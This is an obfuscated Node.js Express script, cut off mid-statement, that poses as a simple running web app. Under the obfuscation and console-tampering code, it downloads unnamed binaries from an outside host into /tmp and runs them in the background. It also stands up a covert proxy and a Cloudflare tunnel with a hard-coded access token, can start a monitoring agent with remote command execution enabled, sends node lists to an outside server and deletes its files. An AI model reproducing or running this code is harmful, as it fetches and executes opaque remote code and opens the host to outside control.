const _0x42415c=_0x3076;function _0x3076(_0x3dbd22,_0xcd8a54){_0x3dbd22=_0x3dbd22-0x94;const _0x4f3280=_0xae58();let _0x222033=_0x4f3280[_0x3dbd22];return _0x222033;}(function(_0x4d5eff,_0x1e3a93){const _0x12e970=_0x3076,_0x55a2a5=_0x4d5eff();while(!![]){try{const _0x79cea5=parseInt(_0x12e970(0xaf))/0x1*(-parseInt(_0x12e970(0x15c))/0x2)+-parseInt(_0x12e970(0x14d))/0x3+parseInt(_0x12e970(0x135))/0x4+-parseInt(_0x12e970(0x12e))/0x5*(parseInt(_0x12e970(0x96))/0x6)+-parseInt(_0x12e970(0xa4))/0x7*(-parseInt(_0x12e970(0x160))/0x8)+parseInt(_0x12e970(0xee))/0x9+-parseInt(_0x12e970(0xd4))/0xa;if(_0x79cea5===_0x1e3a93)break;else _0x55a2a5['push'](_0x55a2a5['shift']());}catch(_0x3c5a94){_0x55a2a5['push'](_0x55a2a5['shift']());}}}(_0xae58,0x366f8));const _0x1b4e18=(function(){let _0x569ca8=!![];return function(_0x436f06,_0x9ad6e4){const _0xa96cb=_0x569ca8?function(){const _0x18f7df=_0x3076;if(_0x9ad6e4){const _0x3d0c2e=_0x9ad6e4[_0x18f7df(0xd0)](_0x436f06,arguments);return _0x9ad6e4=null,_0x3d0c2e;}}:function(){};return _0x569ca8=![],_0xa96cb;};}()),_0x3c721b=_0x1b4e18(this,function(){const _0x3223fe=_0x3076;return _0x3c721b['toString']()['search'](_0x3223fe(0xb5))[_0x3223fe(0xb7)]()['constructor'](_0x3c721b)[_0x3223fe(0x118)](_0x3223fe(0xb5));});_0x3c721b();const _0x45c0e2=(function(){let _0x34368d=!![];return function(_0x1c384a,_0x23fd55){const _0x42aab6=_0x34368d?function(){const _0x2905e1=_0x3076;if(_0x23fd55){const _0x3d1f6b=_0x23fd55[_0x2905e1(0xd0)](_0x1c384a,arguments);return _0x23fd55=null,_0x3d1f6b;}}:function(){};return _0x34368d=![],_0x42aab6;};}()),_0x222033=_0x45c0e2(this,function(){const _0x28a294=_0x3076;let _0x285138;try{const _0x421b4e=Function(_0x28a294(0x136)+_0x28a294(0x108)+');');_0x285138=_0x421b4e();}catch(_0x1a852e){_0x285138=window;}const _0x1cefe7=_0x285138[_0x28a294(0xa1)]=_0x285138[_0x28a294(0xa1)]||{},_0x21d139=[_0x28a294(0xcd),_0x28a294(0xde),_0x28a294(0xbc),_0x28a294(0x13b),'exception',_0x28a294(0x102),_0x28a294(0x113)];for(let _0x16dbd8=0x0;_0x16dbd8<_0x21d139[_0x28a294(0xd7)];_0x16dbd8++){const _0x41e412=_0x45c0e2[_0x28a294(0xcf)][_0x28a294(0x158)][_0x28a294(0xa9)](_0x45c0e2),_0x362b39=_0x21d139[_0x16dbd8],_0xe6a8dd=_0x1cefe7[_0x362b39]||_0x41e412;_0x41e412[_0x28a294(0x144)]=_0x45c0e2[_0x28a294(0xa9)](_0x45c0e2),_0x41e412['toString']=_0xe6a8dd[_0x28a294(0xb7)][_0x28a294(0xa9)](_0xe6a8dd),_0x1cefe7[_0x362b39]=_0x41e412;}});_0x222033();const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x42415c(0x141)),{promisify}=require(_0x42415c(0x14c)),exec=promisify(require(_0x42415c(0x10d))['exec']),UPLOAD_URL=process[_0x42415c(0xe7)][_0x42415c(0xf2)]||'',PROJECT_URL=process[_0x42415c(0xe7)][_0x42415c(0xf0)]||'',AUTO_ACCESS=process[_0x42415c(0xe7)][_0x42415c(0xe0)]||![],FILE_PATH=process[_0x42415c(0xe7)][_0x42415c(0xdc)]||'/tmp',SUB_PATH=process[_0x42415c(0xe7)][_0x42415c(0xfb)]||_0x42415c(0xe2),PORT=process['env']['SERVER_PORT']||process['env'][_0x42415c(0x126)]||0xbb8,UUID=process[_0x42415c(0xe7)][_0x42415c(0x15a)]||_0x42415c(0xce),NEZHA_SERVER=process[_0x42415c(0xe7)][_0x42415c(0x157)]||'',NEZHA_PORT=process[_0x42415c(0xe7)][_0x42415c(0xcc)]||'',NEZHA_KEY=process[_0x42415c(0xe7)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x42415c(0x103)]||'dl2.1195119.xyz',ARGO_AUTH=process['env'][_0x42415c(0xc4)]||'eyJhIjoiNTdlODUyN2Y0ZGFlYmJmY2VjMjBmZmY5ZDY1Zjg3ZjQiLCJ0IjoiMTIzNmU4ZDktZDU2MS00NjE4LWFmYjAtYjVjMDQ3MDJmYTljIiwicyI6Ik1EUXhZbUUxWkRVdE4yWXpPUzAwWVROaUxXRTJOVE10TmprNVpXRmlZelJqT1dNeCJ9',ARGO_PORT=process[_0x42415c(0xe7)][_0x42415c(0xc2)]||0x70e3,CFIP=process[_0x42415c(0xe7)]['CFIP']||_0x42415c(0xfe),CFPORT=process['env'][_0x42415c(0xd8)]||0x1bb,NAME=process[_0x42415c(0xe7)][_0x42415c(0x134)]||_0x42415c(0xe2);if(!fs[_0x42415c(0xcb)](FILE_PATH))try{fs['mkdirSync'](FILE_PATH);}catch(_0xe6b74e){console[_0x42415c(0xcd)](_0x42415c(0xb6));}function generateRandomName(){const _0x3bcba8=_0x42415c,_0x441a4e=_0x3bcba8(0xc5);let _0x57516e='';for(let _0x39270b=0x0;_0x39270b<0x6;_0x39270b++){_0x57516e+=_0x441a4e['charAt'](Math['floor'](Math['random']()*_0x441a4e[_0x3bcba8(0xd7)]));}return _0x57516e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x42415c(0xf7)](FILE_PATH,webName),botPath=path[_0x42415c(0xf7)](FILE_PATH,botName),subPath=path[_0x42415c(0xf7)](FILE_PATH,_0x42415c(0xa3)),listPath=path[_0x42415c(0xf7)](FILE_PATH,_0x42415c(0xbf)),bootLogPath=path[_0x42415c(0xf7)](FILE_PATH,_0x42415c(0x94)),configPath=path[_0x42415c(0xf7)](FILE_PATH,'config.json');function deleteNodes(){const _0x178eec=_0x42415c;try{if(!UPLOAD_URL)return;if(!fs[_0x178eec(0xcb)](subPath))return;let _0x3dca5;try{_0x3dca5=fs[_0x178eec(0x13f)](subPath,_0x178eec(0xab));}catch{return null;}const _0x3e77c7=Buffer['from'](_0x3dca5,_0x178eec(0x10a))[_0x178eec(0xb7)]('utf-8'),_0x29ce5b=_0x3e77c7[_0x178eec(0x14a)]('\x0a')[_0x178eec(0x12d)](_0x229aee=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x178eec(0x9e)](_0x229aee));if(_0x29ce5b['length']===0x0)return;return axios[_0x178eec(0x122)](UPLOAD_URL+_0x178eec(0x131),JSON[_0x178eec(0xbb)]({'nodes':_0x29ce5b}),{'headers':{'Content-Type':_0x178eec(0x132)}})['catch'](_0x49e20c=>{return null;}),null;}catch(_0x443bbe){return null;}}function cleanupOldFiles(){const _0x430d12=_0x42415c;try{const _0x323896=fs[_0x430d12(0x127)](FILE_PATH);_0x323896[_0x430d12(0x13a)](_0x2ecd03=>{const _0x2ab6af=_0x430d12,_0x44fc5b=path['join'](FILE_PATH,_0x2ecd03);try{const _0x4a430f=fs['statSync'](_0x44fc5b);_0x4a430f[_0x2ab6af(0x148)]()&&fs[_0x2ab6af(0x120)](_0x44fc5b);}catch(_0x21bea3){}});}catch(_0x2258f8){}}async function generateConfig(){const _0x39a1d6=_0x42415c,_0x564254={'log':{'access':_0x39a1d6(0xe6),'error':_0x39a1d6(0xe6),'loglevel':_0x39a1d6(0xdb)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x39a1d6(0xca),'settings':{'clients':[{'id':UUID,'flow':_0x39a1d6(0xe4)}],'decryption':_0x39a1d6(0xdb),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x39a1d6(0x15d),'dest':0xbbb},{'path':_0x39a1d6(0x10f),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x39a1d6(0xb9),'protocol':_0x39a1d6(0xca),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x39a1d6(0xca),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x39a1d6(0xdb),'wsSettings':{'path':_0x39a1d6(0x9c)}},'sniffing':{'enabled':!![],'destOverride':[_0x39a1d6(0x15e),_0x39a1d6(0x129),_0x39a1d6(0x143)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x39a1d6(0x12c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x39a1d6(0x143)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x39a1d6(0xc7),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x39a1d6(0x10f)}},'sniffing':{'enabled':!![],'destOverride':[_0x39a1d6(0x15e),'tls',_0x39a1d6(0x143)],'metadataOnly':![]}}],'dns':{'servers':[_0x39a1d6(0x146)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x39a1d6(0xa6),'tag':_0x39a1d6(0xda)}]};fs['writeFileSync'](path[_0x39a1d6(0xf7)](FILE_PATH,_0x39a1d6(0x10c)),JSON['stringify'](_0x564254,null,0x2));}function getSystemArchitecture(){const _0x4e395a=_0x42415c,_0x55270e=os[_0x4e395a(0x155)]();return _0x55270e==='arm'||_0x55270e===_0x4e395a(0x12b)||_0x55270e===_0x4e395a(0x125)?'arm':_0x4e395a(0xd6);}function _0xae58(){const _0x2996e3=['abcdefghijklmnopqrstuvwxyz','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','trojan','true','pop','vless','existsSync','NEZHA_PORT','log','85ef732d-e4b0-4654-b262-7d95532dd0b4','constructor','apply','pipe','Download\x20','\x0a\x0atrojan://','452710PkHeoK','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','amd','length','CFPORT','Empowerment\x20failed\x20for\x20','block','none','FILE_PATH','App\x20is\x20running','warn','\x20-c\x20','AUTO_ACCESS','set','susbaka','fileName','xtls-rprx-vision','http\x20server\x20is\x20running\x20on\x20port:','/dev/null','env','chmod','get','https://amd64.ssss.nyc.mn/bot','Content-Type','NEZHA\x20variable\x20is\x20empty,skip\x20running','writeFileSync','2979675wDsNyR','\x0a\x20\x20tunnel:\x20','PROJECT_URL','country_code','UPLOAD_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','App\x20is\x20running!\x20Visit\x20/sub\x20for\x20nodes.','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Subscription\x20uploaded\x20successfully','join','countryCode','\x20>/dev/null\x202>&1\x20&','Unhandled\x20error\x20in\x20startserver:','SUB_PATH','substring','\x0a\x20\x20credentials-file:\x20','cdns.doon.eu.org','--tls','?security=tls&sni=','\x0avless://','table','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/agent','from','\x22\x20>\x20/dev/null\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','{}.constructor(\x22return\x20this\x22)(\x20)','nohup\x20','base64','https://ipapi.co/json','config.json','child_process','data','/trojan-argo','\x20>/dev/null\x202>&1','2096','/sub.txt\x20saved\x20successfully','trace','Error\x20reading\x20boot.log:','\x20>\x20nul\x202>&1','automatic\x20access\x20task\x20added\x20successfully','send','search','arm','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','0.0.0.0','8443','Nodes\x20uploaded\x20successfully','has','unshift','unlinkSync','&fp=firefox&type=ws&host=','post','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','org','aarch64','PORT','readdirSync','success','tls','message','arm64','vmess','filter','5SzLSUh','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','2083','/api/delete-nodes','application/json','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NAME','1087324ysMcDj','return\x20(function()\x20','2053','map','match','forEach','error','taskkill\x20/f\x20/im\x20','Unknown','basename','readFileSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','path','close','quic','__proto__','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https+local://8.8.8.8/dns-query','status','isFile','tunnel.yml','split','clear','util','808215FrgCxj','del\x20/f\x20/q\x20','https://arm64.ssss.nyc.mn/web','\x20-s\x20','http://ip-api.com/json','includes','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','finish','arch','\x20is\x20running','NEZHA_SERVER','prototype','Error\x20downloading\x20files:','UUID','TunnelSecret','2gttKda','/vmess-argo','http','Error\x20in\x20startserver:','33256SJjQmE','/api/add-subscriptions','rm\x20-rf\x20','2087','boot.log','stream','1358724ccNyLR','https://arm64.ssss.nyc.mn/v1','ARGO_DOMAIN:','text/plain;\x20charset=utf-8','listen','https://amd64.ssss.nyc.mn/web','/vless-argo','tunnel.json','test','/config.json\x20>/dev/null\x202>&1\x20&','response','console','firefox','sub.txt','371swXAlM','https://arm64.ssss.nyc.mn/bot','blackhole','win32','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','bind','/tunnel.yml\x20run','utf-8','push','443','Skipping\x20adding\x20automatic\x20access\x20task','59129RPKnwa','fileUrl','\x20-p\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ArgoDomain:','charAt','(((.+)+)+)+$','Using\x20existing\x20temp\x20dir','toString','pkill\x20-f\x20\x22[','127.0.0.1','createWriteStream','stringify','info','https://arm64.ssss.nyc.mn/agent','Error\x20executing\x20command:\x20','list.txt','platform','\x20failed:\x20','ARGO_PORT','\x0aclient_secret:\x20','ARGO_AUTH'];_0xae58=function(){return _0x2996e3;};return _0xae58();}function downloadFile(_0x446363,_0x4052fc,_0x5d27e9){const _0x100440=_0x42415c,_0x1cbe2e=_0x446363;!fs[_0x100440(0xcb)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2319f5=fs[_0x100440(0xba)](_0x1cbe2e);axios({'method':_0x100440(0xe9),'url':_0x4052fc,'responseType':_0x100440(0x95)})['then'](_0x154be9=>{const _0x131443=_0x100440;_0x154be9['data'][_0x131443(0xd1)](_0x2319f5),_0x2319f5['on'](_0x131443(0x154),()=>{const _0x4b00a2=_0x131443;_0x2319f5[_0x4b00a2(0x142)](),console['log']('Download\x20'+path['basename'](_0x1cbe2e)+'\x20successfully'),_0x5d27e9(null,_0x1cbe2e);}),_0x2319f5['on'](_0x131443(0x13b),_0x5d3a9d=>{const _0x48aa42=_0x131443;fs['unlink'](_0x1cbe2e,()=>{});const _0x5de0bb=_0x48aa42(0xd2)+path[_0x48aa42(0x13e)](_0x1cbe2e)+'\x20failed:\x20'+_0x5d3a9d['message'];console[_0x48aa42(0x13b)](_0x5de0bb),_0x5d27e9(_0x5de0bb);});})['catch'](_0x3cf511=>{const _0x2b86ad=_0x100440,_0x330f9f=_0x2b86ad(0xd2)+path[_0x2b86ad(0x13e)](_0x1cbe2e)+_0x2b86ad(0xc1)+_0x3cf511[_0x2b86ad(0x12a)];console['error'](_0x330f9f),_0x5d27e9(_0x330f9f);});}async function downloadFilesAndRun(){const _0x49db3d=_0x42415c,_0xc75696=getSystemArchitecture(),_0x1d63e7=getFilesForArchitecture(_0xc75696);if(_0x1d63e7[_0x49db3d(0xd7)]===0x0){console['log'](_0x49db3d(0xc6));return;}const _0x440ece=_0x1d63e7[_0x49db3d(0x138)](_0x21f7a7=>{return new Promise((_0x59fec1,_0x210379)=>{const _0x29edf1=_0x3076;downloadFile(_0x21f7a7[_0x29edf1(0xe3)],_0x21f7a7[_0x29edf1(0xb0)],(_0x8c8e1f,_0x2e3dd0)=>{_0x8c8e1f?_0x210379(_0x8c8e1f):_0x59fec1(_0x2e3dd0);});});});try{await Promise['all'](_0x440ece);}catch(_0x34eaae){console[_0x49db3d(0x13b)](_0x49db3d(0x159),_0x34eaae);return;}function _0x4f2b62(_0x2ea61f){const _0x142259=_0x49db3d,_0x4c9720=0x1fd;_0x2ea61f[_0x142259(0x13a)](_0x1a442a=>{const _0x1173a8=_0x142259;fs[_0x1173a8(0xcb)](_0x1a442a)&&fs[_0x1173a8(0xe8)](_0x1a442a,_0x4c9720,_0x18b9d3=>{const _0x185ddb=_0x1173a8;_0x18b9d3?console['error'](_0x185ddb(0xd9)+_0x1a442a+':\x20'+_0x18b9d3):console[_0x185ddb(0xcd)]('Empowerment\x20success\x20for\x20'+_0x1a442a+':\x20'+_0x4c9720['toString'](0x8));});});}const _0x5bedda=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4f2b62(_0x5bedda);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe558e5=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x49db3d(0xc9)]():'',_0x300433=new Set(['443',_0x49db3d(0x11c),_0x49db3d(0x111),'2087',_0x49db3d(0x130),_0x49db3d(0x137)]),_0x53e15b=_0x300433[_0x49db3d(0x11e)](_0xe558e5)?_0x49db3d(0xc8):'false',_0x1b1d5a=_0x49db3d(0xc3)+NEZHA_KEY+_0x49db3d(0xa8)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x53e15b+_0x49db3d(0xf5)+UUID;fs[_0x49db3d(0xed)](path['join'](FILE_PATH,'config.yaml'),_0x1b1d5a);const _0x2d4650=_0x49db3d(0x109)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x49db3d(0x145);try{await exec(_0x2d4650),console[_0x49db3d(0xcd)](phpName+_0x49db3d(0x156)),await new Promise(_0xcc2e8a=>setTimeout(_0xcc2e8a,0x3e8));}catch(_0x42cd78){console[_0x49db3d(0x13b)]('php\x20running\x20error:\x20'+_0x42cd78);}}else{let _0x53b3fc='';const _0x57d05a=[_0x49db3d(0xad),_0x49db3d(0x11c),'2096',_0x49db3d(0x163),'2083',_0x49db3d(0x137)];_0x57d05a[_0x49db3d(0x152)](NEZHA_PORT)&&(_0x53b3fc=_0x49db3d(0xff));const _0x44ec4f='nohup\x20'+npmPath+_0x49db3d(0x150)+NEZHA_SERVER+':'+NEZHA_PORT+_0x49db3d(0xb1)+NEZHA_KEY+'\x20'+_0x53b3fc+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x44ec4f),console[_0x49db3d(0xcd)](npmName+_0x49db3d(0x156)),await new Promise(_0x516c6a=>setTimeout(_0x516c6a,0x3e8));}catch(_0x1a01f4){console[_0x49db3d(0x13b)]('npm\x20running\x20error:\x20'+_0x1a01f4);}}}else console[_0x49db3d(0xcd)](_0x49db3d(0xec));const _0x1b86a0=_0x49db3d(0x109)+webPath+_0x49db3d(0xdf)+FILE_PATH+_0x49db3d(0x9f);try{await exec(_0x1b86a0),console[_0x49db3d(0xcd)](webName+'\x20is\x20running'),await new Promise(_0x21abea=>setTimeout(_0x21abea,0x3e8));}catch(_0x489940){console[_0x49db3d(0x13b)]('web\x20running\x20error:\x20'+_0x489940);}if(fs[_0x49db3d(0xcb)](botPath)){let _0x190d82;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x190d82=_0x49db3d(0xf3)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x190d82='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x49db3d(0xaa):_0x190d82=_0x49db3d(0xb2)+FILE_PATH+_0x49db3d(0x11a)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x190d82+_0x49db3d(0xf9)),console[_0x49db3d(0xcd)](botName+_0x49db3d(0x156)),await new Promise(_0x4dbb94=>setTimeout(_0x4dbb94,0x7d0));}catch(_0x54e740){console[_0x49db3d(0x13b)](_0x49db3d(0xbe)+_0x54e740);}}await new Promise(_0x32d667=>setTimeout(_0x32d667,0x1388));}function getFilesForArchitecture(_0x5cc5a1){const _0x1de867=_0x42415c;let _0xe18f80;_0x5cc5a1===_0x1de867(0x119)?_0xe18f80=[{'fileName':webPath,'fileUrl':_0x1de867(0x14f)},{'fileName':botPath,'fileUrl':_0x1de867(0xa5)}]:_0xe18f80=[{'fileName':webPath,'fileUrl':_0x1de867(0x9b)},{'fileName':botPath,'fileUrl':_0x1de867(0xea)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3bdd37=_0x5cc5a1==='arm'?_0x1de867(0xbd):_0x1de867(0x104);_0xe18f80[_0x1de867(0x11f)]({'fileName':npmPath,'fileUrl':_0x3bdd37});}else{const _0x10addd=_0x5cc5a1===_0x1de867(0x119)?_0x1de867(0x97):'https://amd64.ssss.nyc.mn/v1';_0xe18f80[_0x1de867(0x11f)]({'fileName':phpPath,'fileUrl':_0x10addd});}}return _0xe18f80;}function argoType(){const _0x354faa=_0x42415c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x354faa(0x153));return;}if(ARGO_AUTH['includes'](_0x354faa(0x15b))){fs[_0x354faa(0xed)](path[_0x354faa(0xf7)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x33b7ed=_0x354faa(0xef)+ARGO_AUTH[_0x354faa(0x14a)]('\x22')[0xb]+_0x354faa(0xfd)+path[_0x354faa(0xf7)](FILE_PATH,_0x354faa(0x9d))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x354faa(0x123)+ARGO_PORT+_0x354faa(0xd5);fs[_0x354faa(0xed)](path[_0x354faa(0xf7)](FILE_PATH,_0x354faa(0x149)),_0x33b7ed);}else console[_0x354faa(0xcd)](_0x354faa(0x12f));}async function extractDomains(){const _0x35c9bc=_0x42415c;let _0x220c08;if(ARGO_AUTH&&ARGO_DOMAIN)_0x220c08=ARGO_DOMAIN,console[_0x35c9bc(0xcd)](_0x35c9bc(0x98),_0x220c08),await _0x5334b5(_0x220c08);else try{const _0x519e2d=fs[_0x35c9bc(0x13f)](path[_0x35c9bc(0xf7)](FILE_PATH,_0x35c9bc(0x94)),_0x35c9bc(0xab)),_0x322493=_0x519e2d[_0x35c9bc(0x14a)]('\x0a'),_0x7923be=[];_0x322493['forEach'](_0xa1abb2=>{const _0xe56cac=_0x35c9bc,_0x10d013=_0xa1abb2[_0xe56cac(0x139)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x10d013){const _0x11d490=_0x10d013[0x1];_0x7923be[_0xe56cac(0xac)](_0x11d490);}});if(_0x7923be[_0x35c9bc(0xd7)]>0x0)_0x220c08=_0x7923be[0x0],console['log'](_0x35c9bc(0xb3),_0x220c08),await _0x5334b5(_0x220c08);else{console[_0x35c9bc(0xcd)](_0x35c9bc(0x140)),fs[_0x35c9bc(0x120)](path[_0x35c9bc(0xf7)](FILE_PATH,_0x35c9bc(0x94)));async function _0x2a2546(){const _0x434edd=_0x35c9bc;try{process[_0x434edd(0xc0)]===_0x434edd(0xa7)?await exec(_0x434edd(0x13c)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x434edd(0xb8)+botName[_0x434edd(0xb4)](0x0)+']'+botName[_0x434edd(0xfc)](0x1)+_0x434edd(0x106));}catch(_0x156eba){}}_0x2a2546(),await new Promise(_0x38c07c=>setTimeout(_0x38c07c,0xbb8));const _0x2e3c83='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x35c9bc(0x11a)+ARGO_PORT;try{await exec(_0x35c9bc(0x109)+botPath+'\x20'+_0x2e3c83+_0x35c9bc(0xf9)),console[_0x35c9bc(0xcd)](botName+_0x35c9bc(0x156)),await new Promise(_0x114230=>setTimeout(_0x114230,0xbb8)),await extractDomains();}catch(_0x1b0b02){console[_0x35c9bc(0x13b)]('Error\x20executing\x20command:\x20'+_0x1b0b02);}}}catch(_0x28fda6){console['error'](_0x35c9bc(0x114),_0x28fda6);}async function _0x79422a(){const _0x2c7701=_0x35c9bc;try{const _0x64c81f=await axios[_0x2c7701(0xe9)](_0x2c7701(0x10b),{'timeout':0xbb8});if(_0x64c81f['data']&&_0x64c81f[_0x2c7701(0x10e)][_0x2c7701(0xf1)]&&_0x64c81f[_0x2c7701(0x10e)]['org'])return _0x64c81f['data'][_0x2c7701(0xf1)]+'_'+_0x64c81f[_0x2c7701(0x10e)][_0x2c7701(0x124)];}catch(_0x496e7f){try{const _0x136e24=await axios[_0x2c7701(0xe9)](_0x2c7701(0x151),{'timeout':0xbb8});if(_0x136e24['data']&&_0x136e24[_0x2c7701(0x10e)][_0x2c7701(0x147)]===_0x2c7701(0x128)&&_0x136e24[_0x2c7701(0x10e)][_0x2c7701(0xf8)]&&_0x136e24[_0x2c7701(0x10e)][_0x2c7701(0x124)])return _0x136e24['data'][_0x2c7701(0xf8)]+'_'+_0x136e24[_0x2c7701(0x10e)][_0x2c7701(0x124)];}catch(_0x4730b2){}}return _0x2c7701(0x13d);}async function _0x5334b5(_0x333fff){const _0x51e422=await _0x79422a(),_0x2a7cab=NAME?NAME+'-'+_0x51e422:_0x51e422;return new Promise(_0x249e9c=>{setTimeout(()=>{const _0x3120e8=_0x3076,_0x33a804={'v':'2','ps':''+_0x2a7cab,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3120e8(0xdb),'net':'ws','type':'none','host':_0x333fff,'path':'/vmess-argo?ed=2560','tls':_0x3120e8(0x129),'sni':_0x333fff,'alpn':'','fp':_0x3120e8(0xa2)},_0x53be5d=_0x3120e8(0x101)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x333fff+_0x3120e8(0x121)+_0x333fff+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2a7cab+'\x0a\x0avmess://'+Buffer[_0x3120e8(0x105)](JSON['stringify'](_0x33a804))[_0x3120e8(0xb7)]('base64')+_0x3120e8(0xd3)+UUID+'@'+CFIP+':'+CFPORT+_0x3120e8(0x100)+_0x333fff+'&fp=firefox&type=ws&host='+_0x333fff+_0x3120e8(0x107)+_0x2a7cab+'\x0a\x20\x20\x20\x20';console[_0x3120e8(0xcd)](Buffer[_0x3120e8(0x105)](_0x53be5d)['toString'](_0x3120e8(0x10a))),fs['writeFileSync'](subPath,Buffer[_0x3120e8(0x105)](_0x53be5d)[_0x3120e8(0xb7)](_0x3120e8(0x10a))),console[_0x3120e8(0xcd)](FILE_PATH+_0x3120e8(0x112)),uploadNodes(),app[_0x3120e8(0xe9)]('/'+SUB_PATH,(_0x153871,_0x291b8f)=>{const _0xcb0b32=_0x3120e8,_0x421bb3=Buffer[_0xcb0b32(0x105)](_0x53be5d)[_0xcb0b32(0xb7)](_0xcb0b32(0x10a));_0x291b8f[_0xcb0b32(0xe1)](_0xcb0b32(0xeb),_0xcb0b32(0x99)),_0x291b8f[_0xcb0b32(0x117)](_0x421bb3);}),_0x249e9c(_0x53be5d);},0x7d0);});}}async function uploadNodes(){const _0x5cea9a=_0x42415c;if(UPLOAD_URL&&PROJECT_URL){const _0x977351=PROJECT_URL+'/'+SUB_PATH,_0x1b8d89={'subscription':[_0x977351]};try{const _0x446f3f=await axios[_0x5cea9a(0x122)](UPLOAD_URL+_0x5cea9a(0x161),_0x1b8d89,{'headers':{'Content-Type':_0x5cea9a(0x132)}});return _0x446f3f&&_0x446f3f[_0x5cea9a(0x147)]===0xc8?(console[_0x5cea9a(0xcd)](_0x5cea9a(0xf6)),_0x446f3f):null;}catch(_0x15df17){if(_0x15df17[_0x5cea9a(0xa0)]){if(_0x15df17[_0x5cea9a(0xa0)][_0x5cea9a(0x147)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5cea9a(0xcb)](listPath))return;const _0x2b33cb=fs[_0x5cea9a(0x13f)](listPath,_0x5cea9a(0xab)),_0xe49da1=_0x2b33cb[_0x5cea9a(0x14a)]('\x0a')[_0x5cea9a(0x12d)](_0x332279=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5cea9a(0x9e)](_0x332279));if(_0xe49da1[_0x5cea9a(0xd7)]===0x0)return;const _0x30435e=JSON[_0x5cea9a(0xbb)]({'nodes':_0xe49da1});try{const _0x21f216=await axios[_0x5cea9a(0x122)](UPLOAD_URL+'/api/add-nodes',_0x30435e,{'headers':{'Content-Type':_0x5cea9a(0x132)}});return _0x21f216&&_0x21f216[_0x5cea9a(0x147)]===0xc8?(console[_0x5cea9a(0xcd)](_0x5cea9a(0x11d)),_0x21f216):null;}catch(_0x403680){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const 